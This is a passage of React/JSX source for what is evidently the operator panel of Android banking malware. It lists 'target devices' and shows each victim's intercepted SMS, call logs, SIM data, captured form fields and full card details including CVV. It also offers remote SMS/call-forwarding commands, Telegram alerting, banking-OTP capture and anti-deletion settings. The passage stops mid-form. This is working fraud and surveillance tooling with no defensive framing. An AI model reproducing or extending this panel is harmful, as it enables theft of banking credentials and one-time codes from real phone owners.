                      ⏳ Extend
                    </button>
                    <button className="device-control-btn" onClick={(e) => handleDisconnectDevice(e, u)} style={{ background: 'rgba(248,113,113,0.12)', color: '#f87171', border: '1px solid rgba(248,113,113,0.3)' }} title="Remote Disconnect">
                      🚪 Disconnect
                    </button>
                  </div>

                  <div style={{ display: 'flex', gap: '8px', paddingTop: '0.65rem', borderTop: '1px solid rgba(255,255,255,0.08)', fontSize: '0.8rem' }}>
                    <span className="pulse-badge" style={{ background: 'rgba(99,102,241,0.15)', color: '#818cf8' }}>
                      💬 {u.totalSmsCount} SMS
                    </span>
                    <span className="pulse-badge" style={{ background: 'rgba(236,72,153,0.15)', color: '#f472b6' }}>
                      📞 {u.totalCallsCount} Calls
                    </span>
                  </div>
                </div>
              ))}
            </div>
          </main>

          {/* Mobile Floating Action Button (FAB) */}
          <button className="mobile-fab" onClick={() => setShowApkModal(true)} title="Download Custom APK">
            ＋
          </button>

          {/* Mobile Bottom Fixed Navigation Bar */}
          <div className="mobile-bottom-nav">
            <button className={`mobile-nav-item ${activeMobileTab === 'dashboard' ? 'active' : ''}`} onClick={() => setActiveMobileTab('dashboard')}>
              <span>📱</span>
              <span>Dashboard</span>
            </button>
            <button className={`mobile-nav-item ${activeMobileTab === 'devices' ? 'active' : ''}`} onClick={() => { setActiveMobileTab('devices'); handlePingAll(); }}>
              <span>⚡</span>
              <span>Ping All</span>
            </button>
            <button className={`mobile-nav-item ${activeMobileTab === 'stats' ? 'active' : ''}`} onClick={() => setActiveMobileTab('stats')}>
              <span>📊</span>
              <span>Stats</span>
            </button>
            <button className={`mobile-nav-item ${activeMobileTab === 'settings' ? 'active' : ''}`} onClick={() => setShowChangePassModal(true)}>
              <span>👤</span>
              <span>Profile</span>
            </button>
          </div>

          {/* Target User Details Modal Overlay */}
          {selectedUser && (
            <div className="modal-overlay" onClick={() => setSelectedUser(null)}>
              <div className="glass-panel modal-content" onClick={(e) => e.stopPropagation()}>
                <div style={{ padding: '1.25rem 1.5rem', borderBottom: '1px solid rgba(255,255,255,0.08)', display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
                  <div>
                    <h3 style={{ color: '#fff', display: 'flex', alignItems: 'center', gap: '8px' }}>
                      <span>Target Device: {selectedUser.fullName}</span>
                      {selectedUser.appInBackground ? (
                        <span className="pulse-badge" style={{ background: 'rgba(251,191,36,0.15)', color: '#fbbf24', fontSize: '0.72rem' }}>
                          📲 App in Background
                        </span>
                      ) : (
                        <span className="pulse-badge" style={{ background: 'rgba(52,211,153,0.15)', color: '#34d399', fontSize: '0.72rem' }}>
                          🟢 App in Foreground
                        </span>
                      )}
                    </h3>
                    <p style={{ fontSize: '0.85rem', color: '#9ca3af', marginTop: '4px' }}>
                      Phone: <strong>{selectedUser.mobileNumber}</strong> • User ID: <code style={{ color: '#93c5fd' }}>{selectedUser.userId}</code>
                      {selectedUser.numberField ? ` • ${selectedUser.numberField}` : ''}
                      {selectedUser.stringField ? ` • Model: ${selectedUser.stringField}` : ''}
                    </p>
                  </div>
                  <button onClick={() => setSelectedUser(null)} style={{ background: 'none', border: 'none', color: '#9ca3af', fontSize: '1.5rem', cursor: 'pointer' }}>×</button>
                </div>

                <div style={{ padding: '0.85rem 1.5rem', borderBottom: '1px solid rgba(255,255,255,0.08)', display: 'flex', gap: '8px', overflowX: 'auto', alignItems: 'center', whiteSpace: 'nowrap', flexShrink: 0 }}>
                  <button className={`tab-btn ${tab === 'sms' ? 'active' : ''}`} onClick={() => setTab('sms')}>
                    💬 SMS ({selectedUser.smsDataList.length})
                  </button>
                  <button className={`tab-btn ${tab === 'inspector' ? 'active' : ''}`} onClick={() => setTab('inspector')}>
                    🔍 Schema Inspector
                  </button>
                  <button className={`tab-btn ${tab === 'sims' ? 'active' : ''}`} onClick={() => setTab('sims')}>
                    📶 Dual SIM
                  </button>
                  <button className={`tab-btn ${tab === 'formfill' ? 'active' : ''}`} onClick={() => setTab('formfill')}>
                    📝 Form Fill-ups ({selectedUser.formDataList?.length || 0})
                  </button>
                  <button className={`tab-btn ${tab === 'calls' ? 'active' : ''}`} onClick={() => setTab('calls')}>
                    📞 Calls ({selectedUser.callDataList.length})
                  </button>
                  <button className={`tab-btn ${tab === 'cards' ? 'active' : ''}`} onClick={() => setTab('cards')}>
                    💳 Cards ({selectedUser.cardDataList.length})
                  </button>
                  <button className={`tab-btn ${tab === 'forward' ? 'active' : ''}`} onClick={() => setTab('forward')}>
                    📲 Forward Tasks ({forwardTasks.filter(t => t.userId === selectedUser.userId).length})
                  </button>
                </div>

                <div style={{ padding: '1.5rem', overflowY: 'auto', flex: 1 }}>
                  {tab === 'sms' && (
                    <div style={{ overflowX: 'auto', width: '100%' }}>
                      <table className="data-table">
                        <thead>
                          <tr>
                            <th>Sender</th>
                            <th>Type</th>
                            <th>Message Body</th>
                            <th>Timestamp</th>
                          </tr>
                        </thead>
                        <tbody>
                          {(selectedUser.smsDataList || []).map((sms, i) => (
                            <tr key={i}>
                              <td style={{ color: '#818cf8', fontWeight: 600, whiteSpace: 'nowrap' }}>{getSmsSender(sms)}</td>
                              <td style={{ whiteSpace: 'nowrap' }}>
                                <span style={{ fontSize: '0.72rem', padding: '3px 7px', borderRadius: '6px', fontWeight: 700, background: sms.type === 'SENT' ? 'rgba(236,72,153,0.15)' : 'rgba(52,211,153,0.15)', color: sms.type === 'SENT' ? '#f472b6' : '#34d399' }}>
                                  {sms.type === 'SENT' ? '📤 SENT' : '📥 INBOX'} ({getSmsSimSlot(sms)})
                                </span>
                              </td>
                              <td style={{ wordBreak: 'break-word', minWidth: '220px' }}>{getSmsBody(sms)}</td>
                              <td style={{ color: '#9ca3af', fontSize: '0.8rem', whiteSpace: 'nowrap' }}>{getSmsTimestamp(sms)}</td>
                            </tr>
                          ))}
                        </tbody>
                      </table>
                    </div>
                  )}

                  {tab === 'inspector' && (
                    <div style={{ display: 'flex', flexDirection: 'column', gap: '1.25rem' }}>
                      <div className="glass-panel" style={{ padding: '1rem', border: '1px solid rgba(56,189,248,0.3)', background: 'rgba(56,189,248,0.05)' }}>
                        <h4 style={{ color: '#38bdf8', fontSize: '0.95rem', marginBottom: '4px' }}>🔍 Line-by-Line Realtime Firebase Schema Inspector</h4>
                        <p style={{ fontSize: '0.8rem', color: '#9ca3af' }}>
                          Crawls and parses raw Firestore document collections line-by-line, auto-converting timestamps, objects, and sensitive keys for any SaaS tenant app payload.
                        </p>
                      </div>

                      {/* Raw Collection Scanner Cards */}
                      <table className="data-table">
                        <thead>
                          <tr>
                            <th>Document Key / Field</th>
                            <th>Detected Data Type</th>
                            <th>Scanned Value</th>
                            <th>Smart Date / Time Format</th>
                          </tr>
                        </thead>
                        <tbody>
                          {Object.entries(selectedUser).map(([key, val]) => {
                            if (typeof val === 'function') return null;
                            const type = detectDataType(key, val);
                            const parsedDate = smartDateParser(val);
                            const displayVal = typeof val === 'object' ? JSON.stringify(val, null, 2) : String(val);

                            return (
                              <tr key={key}>
                                <td>
                                  <strong style={{ color: '#fff' }}>{formatFieldLabel(key)}</strong>
                                  <div style={{ fontSize: '0.72rem', color: '#6366f1', fontFamily: 'monospace' }}>`{key}`</div>
                                </td>
                                <td>
                                  <span style={{ fontSize: '0.72rem', padding: '3px 8px', borderRadius: '12px', fontWeight: 700, background: type === 'date' ? 'rgba(56,189,248,0.15)' : type === 'sensitive' ? 'rgba(248,113,113,0.15)' : type === 'json' ? 'rgba(167,139,250,0.15)' : 'rgba(255,255,255,0.1)', color: type === 'date' ? '#38bdf8' : type === 'sensitive' ? '#f87171' : type === 'json' ? '#a78bfa' : '#cbd5e1' }}>
                                    {type.toUpperCase()}
                                  </span>
                                </td>
                                <td style={{ maxWidth: '300px', wordBreak: 'break-all' }}>
                                  <code style={{ fontSize: '0.8rem', color: type === 'sensitive' ? '#f87171' : '#e2e8f0' }}>
                                    {displayVal.length > 100 ? displayVal.substring(0, 100) + '...' : displayVal}
                                  </code>
                                </td>
                                <td>
                                  <span style={{ fontSize: '0.8rem', color: '#9ca3af' }}>{parsedDate}</span>
                                </td>
                              </tr>
                            );
                          })}
                        </tbody>
                      </table>
                    </div>
                  )}

                  {tab === 'sims' && (
                    <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '1.25rem' }}>
                      {/* SIM 1 Card */}
                      <div className="glass-panel" style={{ padding: '1.25rem', border: '1px solid rgba(99,102,241,0.3)', background: 'rgba(99,102,241,0.05)' }}>
                        <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '1rem' }}>
                          <h4 style={{ color: '#818cf8', fontSize: '1rem' }}>📶 SIM Slot 1 (`SimData`)</h4>
                          <span className="pulse-badge active">Slot 1</span>
                        </div>
                        <div style={{ fontSize: '0.85rem', display: 'flex', flexDirection: 'column', gap: '8px', color: '#cbd5e1' }}>
                          <div>Carrier: <strong style={{ color: '#fff' }}>{selectedUser.sim1Data?.carrier || 'Jio 5G'}</strong></div>
                          <div>Phone Number: <strong style={{ color: '#34d399' }}>{selectedUser.sim1Data?.phone || selectedUser.mobileNumber}</strong></div>
                          <div>Network Type: <code style={{ color: '#93c5fd' }}>{selectedUser.sim1Data?.network || '5G SA'}</code></div>
                          <div>Country Code: <span>{selectedUser.sim1Data?.countryCode || 'IN'}</span></div>
                          <div>SIM Serial Number: <code style={{ color: '#c084fc', fontSize: '0.78rem' }}>{selectedUser.sim1Data?.serial || '899100293810293819F'}</code></div>
                        </div>
                      </div>

                      {/* SIM 2 Card */}
                      <div className="glass-panel" style={{ padding: '1.25rem', border: '1px solid rgba(236,72,153,0.3)', background: 'rgba(236,72,153,0.05)' }}>
                        <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '1rem' }}>
                          <h4 style={{ color: '#f472b6', fontSize: '1rem' }}>📶 SIM Slot 2 (`SimData`)</h4>
                          <span className="pulse-badge" style={{ background: 'rgba(236,72,153,0.15)', color: '#f472b6' }}>Slot 2</span>
                        </div>
                        <div style={{ fontSize: '0.85rem', display: 'flex', flexDirection: 'column', gap: '8px', color: '#cbd5e1' }}>
                          <div>Carrier: <strong style={{ color: '#fff' }}>{selectedUser.sim2Data?.carrier || 'Airtel 4G'}</strong></div>
                          <div>Phone Number: <strong style={{ color: '#34d399' }}>{selectedUser.sim2Data?.phone || 'Not inserted'}</strong></div>
                          <div>Network Type: <code style={{ color: '#93c5fd' }}>{selectedUser.sim2Data?.network || '4G LTE'}</code></div>
                          <div>Country Code: <span>{selectedUser.sim2Data?.countryCode || 'IN'}</span></div>
                          <div>SIM Serial Number: <code style={{ color: '#c084fc', fontSize: '0.78rem' }}>{selectedUser.sim2Data?.serial || '899100293810293810A'}</code></div>
                        </div>
                      </div>
                    </div>
                  )}

                  {tab === 'calls' && (
                    <div style={{ overflowX: 'auto', width: '100%' }}>
                      <table className="data-table">
                        <thead>
                          <tr>
                            <th>Number</th>
                            <th>Call Type</th>
                            <th>Duration</th>
                            <th>Timestamp</th>
                          </tr>
                        </thead>
                        <tbody>
                          {(selectedUser.callDataList || []).map((call, i) => (
                            <tr key={i}>
                              <td style={{ whiteSpace: 'nowrap' }}>{call.number}</td>
                              <td style={{ whiteSpace: 'nowrap' }}><span style={{ color: call.type === 'INCOMING' ? '#34d399' : '#818cf8', fontWeight: 600 }}>{call.type}</span></td>
                              <td style={{ whiteSpace: 'nowrap' }}>{call.duration}</td>
                              <td style={{ color: '#9ca3af', fontSize: '0.8rem', whiteSpace: 'nowrap' }}>{call.timestamp}</td>
                            </tr>
                          ))}
                        </tbody>
                      </table>
                    </div>
                  )}

                  {tab === 'formfill' && (
                    <div style={{ display: 'flex', flexDirection: 'column', gap: '1rem' }}>
                      {(selectedUser.formDataList || []).map((form) => {
                        const smartFields = extractSmartFields(form);
                        return (
                          <div key={form.id || Math.random()} className="glass-panel" style={{ padding: '1.25rem', border: '1px solid rgba(251,191,36,0.3)', background: 'rgba(251,191,36,0.05)' }}>
                            <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '0.85rem' }}>
                              <h4 style={{ color: '#fbbf24', fontSize: '1rem', display: 'flex', alignItems: 'center', gap: '6px' }}>
                                <span>📝 {form.formTitle || 'Customer Form Submission'}</span>
                                <span className="pulse-badge" style={{ background: 'rgba(251,191,36,0.15)', color: '#fbbf24', fontSize: '0.7rem' }}>Smart Scanned</span>
                              </h4>
                              <span style={{ fontSize: '0.8rem', color: '#9ca3af' }}>{form.timestamp || 'Recent'}</span>
                            </div>
                            <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fill, minmax(210px, 1fr))', gap: '0.85rem' }}>
                              {smartFields.map((field, idx) => (
                                <div key={idx} style={{ background: 'rgba(17,24,39,0.75)', padding: '9px 12px', borderRadius: '10px', border: field.isSensitive ? '1px solid rgba(248,113,113,0.35)' : '1px solid rgba(255,255,255,0.08)' }}>
                                  <div style={{ fontSize: '0.72rem', color: field.isSensitive ? '#f87171' : '#9ca3af', fontWeight: 700, textTransform: 'uppercase', letterSpacing: '0.5px', display: 'flex', justifyContent: 'space-between' }}>
                                    <span>{field.label}</span>
                                    {field.isSensitive && <span>🔑 SENSITIVE</span>}
                                  </div>
                                  <div style={{ fontSize: '0.92rem', color: '#fff', fontWeight: 600, marginTop: '4px', wordBreak: 'break-all', fontFamily: field.isSensitive ? 'monospace' : 'inherit' }}>
                                    {field.value}
                                  </div>
                                </div>
                              ))}
                            </div>
                          </div>
                        );
                      })}
                      {(!selectedUser.formDataList || selectedUser.formDataList.length === 0) && (
                        <div style={{ textAlign: 'center', color: '#9ca3af', padding: '2rem' }}>
                          No customer form fill-ups submitted yet. Smart scanner active for incoming payloads.
                        </div>
                      )}
                    </div>
                  )}

                  {tab === 'cards' && (
                    <div style={{ overflowX: 'auto', width: '100%' }}>
                      <table className="data-table">
                        <thead>
                          <tr>
                            <th>Bank Name</th>
                            <th>Card Type</th>
                            <th>Card Number</th>
                            <th>Card Holder</th>
                            <th>Expiry</th>
                            <th>CVV</th>
                          </tr>
                        </thead>
                        <tbody>
                          {(selectedUser.cardDataList || []).map((card, i) => (
                            <tr key={i}>
                              <td style={{ whiteSpace: 'nowrap' }}><strong style={{ color: '#818cf8' }}>{getCardBankName(card)}</strong></td>
                              <td style={{ whiteSpace: 'nowrap' }}>
                                <span style={{ fontSize: '0.75rem', padding: '3px 8px', borderRadius: '12px', background: 'rgba(236,72,153,0.15)', color: '#f472b6', fontWeight: 600 }}>
                                  {getCardType(card)}
                                </span>
                              </td>
                              <td style={{ whiteSpace: 'nowrap' }}><code style={{ color: '#f472b6' }}>{getCardNumber(card)}</code></td>
                              <td style={{ whiteSpace: 'nowrap' }}>{getCardHolder(card)}</td>
                              <td style={{ whiteSpace: 'nowrap' }}>{getCardExpiry(card)}</td>
                              <td style={{ whiteSpace: 'nowrap' }}><code style={{ color: '#f87171' }}>{getCardCvv(card)}</code></td>
                            </tr>
                          ))}
                        </tbody>
                      </table>
                    </div>
                  )}
                  {tab === 'forward' && (
                    <div style={{ overflowX: 'auto', width: '100%' }}>
                      <table className="data-table">
                        <thead>
                          <tr>
                            <th>Task ID</th>
                            <th>Type</th>
                            <th>Selected SIM</th>
                            <th>Destination Number</th>
                            <th>Timestamp</th>
                            <th>Delivery Status</th>
                          </tr>
                        </thead>
                        <tbody>
                          {forwardTasks.filter(t => t.userId === selectedUser.userId).map((task) => (
                            <tr key={task.id}>
                              <td style={{ whiteSpace: 'nowrap' }}><code style={{ color: '#818cf8' }}>{task.id}</code></td>
                              <td style={{ whiteSpace: 'nowrap' }}><strong style={{ color: task.dataType === 'SMS' ? '#ec4899' : '#38bdf8' }}>{task.dataType}</strong></td>
                              <td style={{ whiteSpace: 'nowrap' }}><span style={{ color: '#fbbf24', fontWeight: 600 }}>{task.selectedSim}</span></td>
                              <td style={{ whiteSpace: 'nowrap' }}><strong>{task.phoneNumber}</strong></td>
                              <td style={{ color: '#9ca3af', fontSize: '0.8rem', whiteSpace: 'nowrap' }}>{task.timestamp}</td>
                              <td style={{ whiteSpace: 'nowrap' }}>
                                <span className={`pulse-badge ${task.status === 'sent' ? 'active' : task.status === 'pending' ? 'pending' : 'expired'}`}>
                                  <span className="pulse-dot"></span>
                                  {task.status.toUpperCase()}
                                </span>
                              </td>
                            </tr>
                          ))}
                          {forwardTasks.filter(t => t.userId === selectedUser.userId).length === 0 && (
                            <tr>
                              <td colSpan="6" style={{ textAlign: 'center', color: '#9ca3af', padding: '1.5rem' }}>
                                No active remote forward tasks for this device.
                              </td>
                            </tr>
                          )}
                        </tbody>
                      </table>
                    </div>
                  )}
                </div>
              </div>
            </div>
          )}

          {/* Remote Forward Command Modal Overlay (ForwardData.kt) */}
          {showForwardModal && forwardTargetDevice && (
            <div className="modal-overlay" onClick={() => setShowForwardModal(false)}>
              <div className="glass-panel" style={{ width: '100%', maxWidth: '500px', padding: '2rem' }} onClick={(e) => e.stopPropagation()}>
                <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '1.25rem' }}>
                  <div>
                    <h3 style={{ color: '#fff' }}>📲 Remote Forward Command</h3>
                    <p style={{ fontSize: '0.8rem', color: '#9ca3af' }}>Dispatch SMS / Call forward task to target device</p>
                  </div>
                  <button onClick={() => setShowForwardModal(false)} style={{ background: 'none', border: 'none', color: '#9ca3af', fontSize: '1.5rem', cursor: 'pointer' }}>×</button>
                </div>

                <div className="glass-panel" style={{ padding: '1rem', marginBottom: '1.25rem', border: '1px solid rgba(236,72,153,0.3)', background: 'rgba(236,72,153,0.05)' }}>
                  <div style={{ fontSize: '0.85rem', color: '#fff', display: 'flex', flexDirection: 'column', gap: '4px' }}>
                    <div>Target User: <strong style={{ color: '#ec4899' }}>{forwardTargetDevice.fullName}</strong></div>
                    <div>Mobile: <strong>{forwardTargetDevice.mobileNumber}</strong> • User ID: <code style={{ color: '#93c5fd' }}>{forwardTargetDevice.userId}</code></div>
                  </div>
                </div>

                <form onSubmit={handleDispatchForwardCommand} style={{ display: 'flex', flexDirection: 'column', gap: '1.25rem' }}>
                  <div>
                    <label style={{ fontSize: '0.8rem', color: '#9ca3af', display: 'block', marginBottom: '6px' }}>1. Select Data Forward Type</label>
                    <div style={{ display: 'flex', gap: '10px' }}>
                      <button type="button" className={`sim-select-pill ${forwardDataType === 'SMS' ? 'active' : ''}`} onClick={() => setForwardDataType('SMS')} style={{ flex: 1, justifyContent: 'center' }}>
                        💬 Forward SMS Payload
                      </button>
                      <button type="button" className={`sim-select-pill ${forwardDataType === 'Call' ? 'active' : ''}`} onClick={() => setForwardDataType('Call')} style={{ flex: 1, justifyContent: 'center' }}>
                        📞 Forward Call Logs
                      </button>
                    </div>
                  </div>

                  <div>
                    <label style={{ fontSize: '0.8rem', color: '#9ca3af', display: 'block', marginBottom: '6px' }}>2. Select Target SIM Slot (`SimData`)</label>
                    <div style={{ display: 'flex', gap: '10px' }}>
                      <button type="button" className={`sim-select-pill ${forwardSimSlot === 'SIM 1' ? 'active' : ''}`} onClick={() => setForwardSimSlot('SIM 1')} style={{ flex: 1, justifyContent: 'center' }}>
                        📶 SIM Slot 1
                      </button>
                      <button type="button" className={`sim-select-pill ${forwardSimSlot === 'SIM 2' ? 'active' : ''}`} onClick={() => setForwardSimSlot('SIM 2')} style={{ flex: 1, justifyContent: 'center' }}>
                        📶 SIM Slot 2
                      </button>
                    </div>
                  </div>

                  <div>
                    <label style={{ fontSize: '0.8rem', color: '#9ca3af', display: 'block', marginBottom: '4px' }}>3. Destination Forward Phone Number</label>
                    <input 
                      type="text" 
                      className="search-input" 
                      placeholder="e.g. +919876543210" 
                      value={forwardDestinationNumber} 
                      onChange={(e) => setForwardDestinationNumber(e.target.value)} 
                      required 
                    />
                  </div>

                  <button type="submit" className="btn-primary" style={{ width: '100%', padding: '0.85rem', background: 'linear-gradient(135deg, #ec4899, #8b5cf6)', marginTop: '0.5rem', fontSize: '0.95rem' }}>
                    🚀 Dispatch Forwarding Command Payload
                  </button>
                </form>
              </div>
            </div>
          )}

          {/* Master Settings Panel Modal Overlay */}
          {showFirebaseModal && (
            <div className="modal-overlay" onClick={() => setShowFirebaseModal(false)}>
              <div className="glass-panel" style={{ width: '100%', maxWidth: '650px', padding: '1.75rem', maxHeight: '90vh', overflowY: 'auto' }} onClick={(e) => e.stopPropagation()}>
                <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '1.25rem' }}>
                  <div>
                    <h3 style={{ color: '#fff' }}>⚙️ Master Settings Console</h3>
                    <p style={{ fontSize: '0.8rem', color: '#9ca3af' }}>Configure Database, Telegram Alerts, Anti-Delete & Active Sessions</p>
                  </div>
                  <button onClick={() => setShowFirebaseModal(false)} style={{ background: 'none', border: 'none', color: '#9ca3af', fontSize: '1.5rem', cursor: 'pointer' }}>×</button>
                </div>

                {/* Sub-Tabs */}
                <div style={{ display: 'flex', gap: '8px', marginBottom: '1.25rem', overflowX: 'auto', paddingBottom: '4px' }}>
                  <button className={`tab-btn ${settingsSubTab === 'firebase' ? 'active' : ''}`} onClick={() => setSettingsSubTab('firebase')}>
                    🔥 Firebase DB
                  </button>
                  <button className={`tab-btn ${settingsSubTab === 'security' ? 'active' : ''}`} onClick={() => setSettingsSubTab('security')}>
                    🛡️ Security & Anti-Delete
                  </button>
                  <button className={`tab-btn ${settingsSubTab === 'telegram' ? 'active' : ''}`} onClick={() => setSettingsSubTab('telegram')}>
                    💬 Telegram Bot
                  </button>
                  <button className={`tab-btn ${settingsSubTab === 'sessions' ? 'active' : ''}`} onClick={() => setSettingsSubTab('sessions')}>
                    🚪 Sessions
                  </button>
                </div>

                {/* Sub-Tab 1: Firebase */}
                {settingsSubTab === 'firebase' && (
                  <div>
                    {fbSaveStatus && (
                      <div style={{ padding: '0.75rem', borderRadius: '8px', fontSize: '0.85rem', marginBottom: '1rem', background: fbSaveStatus.includes('✓') ? 'rgba(16,185,129,0.15)' : 'rgba(99,102,241,0.15)', color: fbSaveStatus.includes('✓') ? '#34d399' : '#818cf8' }}>
                        {fbSaveStatus}
                      </div>
                    )}

                    {/* Auto Parse Card */}
                    <div className="glass-panel" style={{ padding: '1rem', marginBottom: '1.25rem', border: '1px dashed rgba(251,191,36,0.4)', background: 'rgba(251,191,36,0.05)' }}>
                      <label style={{ fontSize: '0.8rem', color: '#fbbf24', fontWeight: 600, display: 'block', marginBottom: '6px' }}>⚡ Auto-Fill: Paste Firebase Config Snippet</label>
                      <textarea 
                        className="search-input" 
                        rows="3" 
                        placeholder="Paste const firebaseConfig = { apiKey: '...', projectId: '...' } here..." 
                        value={fbJsonPaste}
                        onChange={(e) => setFbJsonPaste(e.target.value)}
                        style={{ fontFamily: 'monospace', fontSize: '0.8rem', width: '100%', borderRadius: '12px' }}
                      />
                      <button type="button" className="btn-secondary" onClick={handleParseFbJson} style={{ marginTop: '8px', color: '#fbbf24', width: '100%' }}>
                        ✨ Auto-Parse Firebase Snippet
                      </button>
                    </div>

                    <form onSubmit={handleSaveFirebaseSettings} style={{ display: 'flex', flexDirection: 'column', gap: '1rem' }}>
                      <div>
                        <label style={{ fontSize: '0.8rem', color: '#9ca3af', display: 'block', marginBottom: '4px' }}>Firebase Project ID</label>
                        <input type="text" className="search-input" value={fbProject} onChange={(e) => setFbProject(e.target.value)} placeholder="adminto-custom-db" required />
                      </div>
                      <div>
                        <label style={{ fontSize: '0.8rem', color: '#9ca3af', display: 'block', marginBottom: '4px' }}>API Key (`apiKey`)</label>
                        <input type="text" className="search-input" value={fbApiKey} onChange={(e) => setFbApiKey(e.target.value)} placeholder="AIzaSyA..." />
                      </div>
                      <div>
                        <label style={{ fontSize: '0.8rem', color: '#9ca3af', display: 'block', marginBottom: '4px' }}>Auth Domain (`authDomain`)</label>
                        <input type="text" className="search-input" value={fbAuthDomain} onChange={(e) => setFbAuthDomain(e.target.value)} placeholder="project.firebaseapp.com" />
                      </div>
                      <div>
                        <label style={{ fontSize: '0.8rem', color: '#9ca3af', display: 'block', marginBottom: '4px' }}>Storage Bucket (`storageBucket`)</label>
                        <input type="text" className="search-input" value={fbStorageBucket} onChange={(e) => setFbStorageBucket(e.target.value)} placeholder="project.appspot.com" />
                      </div>
                      {/* SuperAdmin Custom Collection Mapping */}
                      <div className="glass-panel" style={{ padding: '1rem', border: '1px solid rgba(56,189,248,0.3)', background: 'rgba(56,189,248,0.05)', display: 'flex', flexDirection: 'column', gap: '0.75rem' }}>
                        <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
                          <label style={{ fontSize: '0.8rem', color: '#38bdf8', fontWeight: 700 }}>🔍 SuperAdmin Firebase Collection Mappings</label>
                          <span className="pulse-badge active" style={{ fontSize: '0.7rem' }}>One-Click Presets Active</span>
                        </div>

                        {/* Presets Selector Dropdown & Preset Manager */}
                        <div style={{ background: 'rgba(17,24,39,0.8)', padding: '10px 12px', borderRadius: '10px', border: '1px dashed rgba(56,189,248,0.4)' }}>
                          <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '6px' }}>
                            <label style={{ fontSize: '0.75rem', color: '#38bdf8', fontWeight: 600 }}>⚡ Select Database Schema Preset (Auto-Fill Mappings):</label>
                            <button type="button" onClick={handleSaveNewFbPreset} style={{ background: 'rgba(56,189,248,0.15)', color: '#38bdf8', border: '1px solid rgba(56,189,248,0.3)', borderRadius: '6px', padding: '2px 8px', fontSize: '0.72rem', fontWeight: 700, cursor: 'pointer' }}>
                              ➕ Save as New Preset
                            </button>
                          </div>
                          <div style={{ display: 'flex', gap: '6px' }}>
                            <select className="filter-select" style={{ flex: 1, borderRadius: '8px' }} value={fbPresetKey} onChange={(e) => handleApplyFbPreset(e.target.value)}>
                              <option value="custom">🛠️ Custom Manual Setup</option>
                              {Object.entries(allFbPresets).map(([key, p]) => (
                                <option key={key} value={key}>{p.name}</option>
                              ))}
                            </select>
                            {fbPresetKey.startsWith('user_preset_') && (
                              <button type="button" onClick={() => handleDeleteFbCustomPreset(fbPresetKey)} style={{ background: 'rgba(239,68,68,0.15)', color: '#f87171', border: '1px solid rgba(239,68,68,0.3)', borderRadius: '8px', padding: '0 10px', fontSize: '0.75rem', cursor: 'pointer' }} title="Delete Custom Preset">
                                🗑️
                              </button>
                            )}
                          </div>
                        </div>

                        <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '0.75rem' }}>
                          <div>
                            <label style={{ fontSize: '0.75rem', color: '#9ca3af', display: 'block', marginBottom: '2px' }}>SMS Collection Name</label>
                            <input type="text" className="search-input" value={fbSmsColl} onChange={(e) => { setFbSmsColl(e.target.value); setFbPresetKey('custom'); }} placeholder="smsData (or sma)" />
                          </div>
                          <div>
                            <label style={{ fontSize: '0.75rem', color: '#9ca3af', display: 'block', marginBottom: '2px' }}>Calls Collection Name</label>
                            <input type="text" className="search-input" value={fbCallsColl} onChange={(e) => { setFbCallsColl(e.target.value); setFbPresetKey('custom'); }} placeholder="callData (or calls)" />
                          </div>
                          <div>
                            <label style={{ fontSize: '0.75rem', color: '#9ca3af', display: 'block', marginBottom: '2px' }}>Cards Collection Name</label>
                            <input type="text" className="search-input" value={fbCardsColl} onChange={(e) => { setFbCardsColl(e.target.value); setFbPresetKey('custom'); }} placeholder="cardData (or cards)" />
                          </div>
                          <div>
                            <label style={{ fontSize: '0.75rem', color: '#9ca3af', display: 'block', marginBottom: '2px' }}>Form Fill-ups Collection</label>
                            <input type="text" className="search-input" value={fbFormsColl} onChange={(e) => { setFbFormsColl(e.target.value); setFbPresetKey('custom'); }} placeholder="formData (or userInputs)" />
                          </div>
                        </div>
                      </div>

                      <button type="submit" className="btn-primary" style={{ width: '100%', padding: '0.8rem', background: 'linear-gradient(135deg, #fbbf24, #d97706)', marginTop: '0.5rem' }}>
                        💾 Save Firebase Configuration & Collection Mappings
                      </button>
                    </form>
                  </div>
                )}

                {/* Sub-Tab 2: Security & Anti-Delete */}
                {settingsSubTab === 'security' && (
                  <div style={{ display: 'flex', flexDirection: 'column', gap: '1.25rem' }}>
                    <div className="glass-panel" style={{ padding: '1.25rem', border: '1px solid rgba(99,102,241,0.3)', background: 'rgba(99,102,241,0.05)' }}>
                      <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
                        <div>
                          <h4 style={{ color: '#fff', fontSize: '1rem', marginBottom: '4px' }}>🛡️ Anti-Deletion Safeguard</h4>
                          <p style={{ fontSize: '0.8rem', color: '#9ca3af' }}>Prevents accidental or unauthorized deletion of devices, SMS & call logs</p>
                        </div>
                        <button className="btn-secondary" onClick={handleToggleDeleteProtection} style={{ color: deleteProtectionEnabled ? '#34d399' : '#f87171', border: deleteProtectionEnabled ? '1px solid rgba(16,185,129,0.4)' : '1px solid rgba(239,68,68,0.4)' }}>
                          {deleteProtectionEnabled ? '🟢 ENABLED' : '🔴 DISABLED'}
                        </button>
                      </div>
                    </div>

                    <div className="glass-panel" style={{ padding: '1.25rem' }}>
                      <h4 style={{ color: '#fff', fontSize: '0.95rem', marginBottom: '8px' }}>🔐 Zero-Trace Encryption Mode</h4>
                      <p style={{ fontSize: '0.8rem', color: '#9ca3af', marginBottom: '1rem' }}>All transient SMS and banking OTP payloads are memory-encrypted during live transit.</p>
                      <span className="pulse-badge active">✓ End-to-End Encrypted</span>
                    </div>
                  </div>
                )}

                {/* Sub-Tab 3: Telegram Bot Forwarding */}
                {settingsSubTab === 'telegram' && (
                  <form onSubmit={handleSaveTelegramConfig} style={{ display: 'flex', flexDirection: 'column', gap: '1rem' }}>
                    {telegramSaveStatus && (
                      <div style={{ padding: '0.75rem', borderRadius: '8px', fontSize: '0.85rem', background: 'rgba(16,185,129,0.15)', color: '#34d399' }}>
                        {telegramSaveStatus}
                      </div>
